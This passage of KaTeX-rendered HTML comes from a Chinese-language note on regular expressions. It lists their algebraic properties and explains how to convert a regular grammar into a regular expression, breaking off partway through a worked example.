style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{1}e_{2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>也是正规式，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow><mo>=</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{1}e_{2}\\right)=L\\left(e_{1}\\right)  L\\left(e_{2}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\left(e_{1}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>也是正规式，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup><mo fence=\"true\">)</mo></mrow><mo>=</mo><msup><mrow><mo fence=\"true\">(</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">L\\left(\\left(e_{1}\\right)^{*}\\right)=\\left(L\\left(e_{1}\\right)\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.20001em;vertical-align:-0.35001em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size1\">(</span></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size1\">)</span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n</li>\n</ol>\n<h5 id=\"正规式的一些性质\"><a class=\"markdownIt-Anchor\" href=\"#正规式的一些性质\"></a> 正规式的一些性质</h5>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span></span></span></span>运算的交换律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>B</mi><mo>=</mo><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A|B=B|A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span></span></span></span>运算的结合律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mrow><mo fence=\"true\">(</mo><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>C</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>B</mi><mo fence=\"true\">)</mo></mrow><mi mathvariant=\"normal\">∣</mi><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">A|\\left(B|C\\right)=\\left(A|B\\right)|C</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo>⋅</mo></mrow><annotation encoding=\"application/x-tex\">\\cdot</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.44445em;vertical-align:0em;\"></span><span class=\"mord\">⋅</span></span></span></span>运算的结合律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mrow><mo fence=\"true\">(</mo><mi>B</mi><mi>C</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>A</mi><mi>B</mi><mo fence=\"true\">)</mo></mrow><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">A\\left(BC\\right)=\\left(AB\\right)C</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span></span></span></span></li>\n<li>分配律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mrow><mo fence=\"true\">(</mo><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>C</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mi>A</mi><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>A</mi><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">A\\left(B|C\\right)=AB|AC</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi>ϵ</mi><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi><mi>A</mi><mo>=</mo><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A\\epsilon|\\epsilon A=A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mrow><mo fence=\"true\">(</mo><msup><mi>A</mi><mo>∗</mo></msup><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup><mo>=</mo><msup><mi>A</mi><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\left(A^{*}\\right)^{*}=A^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.688696em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span></li>\n</ol>\n<h4 id=\"正规文法与正规式的相互转换\"><a class=\"markdownIt-Anchor\" href=\"#正规文法与正规式的相互转换\"></a> 正规文法与正规式的相互转换</h4>\n<h5 id=\"正规文法转正规式\"><a class=\"markdownIt-Anchor\" href=\"#正规文法转正规式\"></a> 正规文法转正规式</h5>\n<ol>\n<li>将正规文法中的每个nonterminal表示成关于它的正规式方程，获得一个<strong>联立方程组</strong>。</li>\n<li>终结规则：</li>\n</ol>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>f</mi><mtext>  </mtext><mi>x</mi><mo>=</mo><mi>α</mi><mi>x</mi><mi mathvariant=\"normal\">∣</mi><mi>β</mi><mo separator=\"true\">,</mo><mtext> </mtext><mi>x</mi><mo>=</mo><msup><mi>α</mi><mo>∗</mo></msup><mi>β</mi><mspace linebreak=\"newline\"></mspace><mi>i</mi><mi>f</mi><mtext>  </mtext><mi>x</mi><mo>=</mo><mi>x</mi><mi>α</mi><mi mathvariant=\"normal\">∣</mi><mi>β</mi><mo separator=\"true\">,</mo><mtext> </mtext><mi>x</mi><mo>=</mo><mi>β</mi><msup><mi>α</mi><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">if\\ \\  x=\\alpha x|\\beta,\\ x=\\alpha^{*}\\beta \\\\\nif\\ \\  x=x\\alpha|\\beta,\\ x=\\beta\\alpha^{*}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">x</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.933136em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.933136em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ol start=\"3\">\n<li>用终结规则、分配律、交换律和结合律求解即可。</li>\n</ol>\n<p>一个（不太）简单的例子</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">正</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">文</mi><mi mathvariant=\"normal\">法</mi><mtext> </mtext><mi>G</mi><mi mathvariant=\"normal\">：</mi><mspace linebreak=\"newline\"></mspace><mi>Z</mi><mo>→</mo><mn>0</mn><mi>A</mi><mspace linebreak=\"newline\"></mspace><mi>A</mi><mo>→</mo><mn>0</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>0</mn><mi>B</mi><mspace linebreak=\"newline\"></mspace><mi>B</mi><mo>→</mo><mn>1</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">正规文法\\ G：\\\\\nZ\\rightarrow 0A\\\\\nA\\rightarrow 0A|0B \\\\\nB\\rightarrow 1A|\\epsilon\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">正</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">法</span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">G</span><span class=\"mord cjk_fallback\">：</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord mathdefault\">A</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span 